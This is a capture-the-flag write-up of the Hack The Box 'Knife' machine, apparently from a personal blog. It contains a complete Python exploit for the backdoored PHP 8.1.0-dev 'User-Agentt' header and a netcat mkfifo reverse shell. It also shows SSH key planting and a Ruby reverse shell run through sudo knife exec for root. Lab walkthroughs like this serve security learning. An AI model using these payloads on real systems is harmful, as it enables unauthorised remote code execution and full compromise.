---
layout: default
title : muzec - Knife Writeup
---

![image](https://user-images.githubusercontent.com/69868171/119285678-8f068580-bc10-11eb-8cc3-43af50cce0b8.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```                                                                                                                                                                      
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.129.136.149]
└─$ cat nmap.nmap            
# Nmap 7.91 scan initiated Sun May 23 16:18:08 2021 as: nmap -sC -sV -oA nmap 10.10.10.242
Nmap scan report for 10.10.10.242
Host is up (0.41s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 23 16:19:40 2021 -- 1 IP address (1 host up) scanned in 91.65 seconds
```
We just have 2 open ports let hit it going to the web server which is on port 80 i find nothing spend hours here really.

![image](https://user-images.githubusercontent.com/69868171/119285678-8f068580-bc10-11eb-8cc3-43af50cce0b8.png)

Bursting directory but nothing so i try to run `Nikto` to see what am missing.

![image](https://user-images.githubusercontent.com/69868171/119286004-66cb5680-bc11-11eb-9d1d-b97394d35cef.png)

An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.

The following exploit uses the backdoor to provide a pseudo system shell on the host.

```
#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the full host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't access tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit
```

Now let save in a file for example i use `php-8.1.0-rce.py` now let run it.

![image](https://user-images.githubusercontent.com/69868171/119286341-291afd80-bc12-11eb-8632-0152be044965.png)

And we have shell boom but it really a dumb shell let try to transfer it.

1. Start an Ncat listener *nc -nvlp 4444*
2. rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f *edit the port and IP*

Now let run it on the dumb shell we have to get a new shell on our listener.

![image](https://user-images.githubusercontent.com/69868171/119286723-076e4600-bc13-11eb-9309-aa4aa91d79a9.png)

Spawning a TTY shell with ` python3 -c'import pty; pty.spawn ("/bin/bash")'` and we are good now let get to the home directory to get the user.txt .

![image](https://user-images.githubusercontent.com/69868171/119286858-48fef100-bc13-11eb-9279-c540fe4d64c0.png)

We have user.txt now let move to root seems we have the SSH folder.

### Privilege Escalation

Now moving to the SSH folder we have the private key and the authorized_keys also with public key.

![image](https://user-images.githubusercontent.com/69868171/119286997-94190400-bc13-11eb-91ef-333133aaca9b.png)

Going back to my machine i generated an SSH private and public key and add it to the authorized_keys of the target and also use the private key to SSH into the machine.

![image](https://user-images.githubusercontent.com/69868171/119287328-4b157f80-bc14-11eb-9fdd-0ea15cb61c55.png)

Now let log in.

![image](https://user-images.githubusercontent.com/69868171/119287393-6bddd500-bc14-11eb-9bb8-fb14d8b15c6a.png)

We are in checking `sudo -l` cool seems we can run `knife` to get root.

![image](https://user-images.githubusercontent.com/69868171/119287502-9c257380-bc14-11eb-8243-421bbce68224.png)

Going through `knife command options` found something cool that can give us a reverse shell probably we just need to paly with it.

1. `sudo /usr/bin/knife exec`

![image](https://user-images.githubusercontent.com/69868171/119287815-4d2c0e00-bc15-11eb-9362-c14630a4e2f7.png)

Since it in ruby we need to add a ruby script yes a reverse shell own we be cool.

2. `exit if fork;c=TCPSocket.new("10.0.0.1","5555");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}`

![image](https://user-images.githubusercontent.com/69868171/119287927-8ebcb900-bc15-11eb-849b-598f1f0aac75.png)

Before running let start an Ncat listener.

![image](https://user-images.githubusercontent.com/69868171/119287969-aeec7800-bc15-11eb-9396-f96456a47fdd.png)

Now to run it `Ctrl+D` and boom we should have shell in root.

![image](https://user-images.githubusercontent.com/69868171/119288163-05f24d00-bc16-11eb-87a8-76e1a8e23754.png)

Box rooted and we are done.

![image](https://user-images.githubusercontent.com/69868171/119288387-726d4c00-bc16-11eb-9f86-3f97e974cf1e.png)

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>

